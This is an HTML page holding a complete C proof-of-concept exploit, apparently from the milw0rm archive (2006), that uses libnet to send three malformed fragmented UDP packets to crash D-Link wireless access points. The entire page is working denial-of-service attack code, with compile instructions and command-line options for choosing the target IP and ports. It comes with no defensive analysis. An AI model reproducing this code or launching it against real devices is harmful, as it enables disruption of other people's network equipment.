<html><head><title>D-Link Wireless Access Point (Fragmented UDP) DoS Exploit</title></head><pre>/*
 *  
 * Aaron Portnoy
 *  
 * silc.thunkers.net, thunkers
 *  
 * D-Link Wireless Access Point
 * Fragmented UDP DoS Proof of Concept 
 *  
 *
 * gcc -o dlink_dos dlink_dos.c -lnet -Wall 
 *    
 */     
    
#include &lt;libnet.h&gt;
    
#define DEVICE &quot;eth0&quot;
#define SRC_IP &quot;127.0.0.1&quot;
#define DST_IP &quot;127.0.0.1&quot;
#define SRC_PRT 200
#define DST_PRT 11111
    
void usage (char *name)
{   
    fprintf (stderr,
             &quot;Usage: %s -s &lt;source ip&gt; -d &lt;destination ip&gt;\ 
			-a &lt;source port&gt; -b &lt;destination port&gt; \n&quot;,
             name);
        
    exit (EXIT_FAILURE);
}
    
int gen_packet (char *device, char *pSRC, char *pDST, u_short sPRT,
                u_short dPRT, int count)
{                           

    libnet_t *l = NULL;
    libnet_ptag_t udp = 0;
    libnet_ptag_t ip = 0;
    
    char errbuf[LIBNET_ERRBUF_SIZE];
    char *payload = NULL;
    u_short payload_s = 0, src_prt, dst_prt;
    u_long src_ip, dst_ip;
    int c, frag;
        
    if (!device)
        device = DEVICE;
        
    l = libnet_init (LIBNET_RAW4, device, errbuf);

    if (!l) {
        fprintf (stderr, &quot;libnet_init() failed: %s\n&quot;, errbuf);
        exit (EXIT_FAILURE);
    }
	
    src_ip = pSRC ? libnet_name2addr4 (l, pSRC, LIBNET_RESOLVE) :
        libnet_name2addr4 (l, SRC_IP, LIBNET_RESOLVE);

    dst_ip = pDST ? libnet_name2addr4 (l, pDST, LIBNET_RESOLVE) :
        libnet_name2addr4 (l, DST_IP, LIBNET_RESOLVE);

    src_prt = sPRT ? sPRT : SRC_PRT;

    dst_prt = dPRT ? dPRT : DST_PRT;

    if (count == 1) {
        payload = &quot;\0\0\0\0\0\0\0\0&quot;;
        payload_s = 8;
    }

    udp = libnet_build_udp (src_prt,
                            dst_prt,
                            (LIBNET_UDP_H + payload_s) * 2,
                            0, (unsigned char *)payload, payload_s, l, udp);

    if (udp == -1) {
        fprintf (stderr, &quot;Can't build UDP header: %s\n&quot;, libnet_geterror (l));
        exit (EXIT_FAILURE);
    }

    switch (count) {

    case 1:
        frag = IP_MF;
        break;

    case 2:
        frag = 0x2002;
        break;

    case 3:
        frag = 0x0003;
        break;
    }

    ip = libnet_build_ipv4 (20,
                            0,
                            1800,
                            frag,
                            128,
                            IPPROTO_UDP, 0, src_ip, dst_ip, NULL, 0, l, ip);

    if (ip == -1) {
        fprintf (stderr, &quot;Can't build IP header: %s\n&quot;, libnet_geterror (l));
        exit (EXIT_FAILURE);
    }

    c = libnet_write (l);

    if (c == -1) {
        fprintf (stderr, &quot;Write error: %s\n&quot;, libnet_geterror (l));
        exit (EXIT_FAILURE);
    }

    printf (&quot;Wrote UDP packet; check the wire.\n&quot;);

    libnet_destroy (l);

    return (EXIT_SUCCESS);

}

int main (int argc, char **argv)
{

    int i;
    char *pDST, *pSRC, *device;
    u_short dPRT = 0;
    u_short sPRT = 0;

    pDST = pSRC = device = NULL;

    while ((i = getopt (argc, argv, &quot;D:d:s:a:b:h&quot;)) != EOF) {
        switch (i) {
        case 'D':
            device = optarg;
            break;
        case 'd':
            pDST = optarg;
            break;
        case 's':
            pSRC = optarg;
            break;
        case 'a':
            sPRT = atoi (optarg);
            break;
        case 'b':
            dPRT = atoi (optarg);
            break;
        case 'h':
            usage (argv[0]);
            break;
        }
    }

    printf (&quot;\n----------------------------------\n&quot;);
    printf (&quot;      -=    D-Link DoS PoC     =-\n&quot;);
    printf (&quot;          Aaron Portnoy\n&quot;);
    printf (&quot;       deft () thunkers ! net     \n&quot;);
    printf (&quot;   silc.thunkers.net, thunkers\n&quot;);
    printf (&quot;----------------------------------\n&quot;);


    device ? printf (&quot;\nDevice: \t%s\n&quot;, device) :
        printf (&quot;\nDevice: \t%s\n&quot;, DEVICE);

    pSRC ? printf (&quot;SRC IP: \t%s\n&quot;, pSRC) :
        printf (&quot;SRC IP: \t%s\n&quot;, SRC_IP);

    pDST ? printf (&quot;DST IP: \t%s\n&quot;, pDST) :
        printf (&quot;DST IP: \t%s\n&quot;, DST_IP);

    sPRT ? printf (&quot;SPort: \t\t%d\n&quot;, sPRT) :
        printf (&quot;SPort: \t\t%d\n&quot;, SRC_PRT);

    dPRT ? printf (&quot;DPort: \t\t%d\n\n&quot;, dPRT) :
        printf (&quot;DPort: \t\t%d\n\n&quot;, DST_PRT);

    for (i = 1; i &lt;= 3; i++)
        gen_packet (device, pSRC, pDST, sPRT, dPRT, i);
    printf (&quot;\n&quot;);

    return (EXIT_SUCCESS);
}

// milw0rm.com [2006-02-14]</pre></html>